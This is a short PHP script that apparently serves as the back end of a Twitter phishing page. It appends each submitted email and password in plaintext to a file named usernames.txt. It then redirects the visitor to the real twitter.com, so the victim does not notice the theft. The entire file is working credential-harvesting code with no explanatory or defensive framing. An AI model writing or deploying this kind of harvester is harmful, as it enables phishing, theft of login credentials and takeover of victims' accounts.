<?php 
file_put_contents("usernames.txt", "Twitter Username: " . $_POST['email'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://twitter.com');
exit();
?>
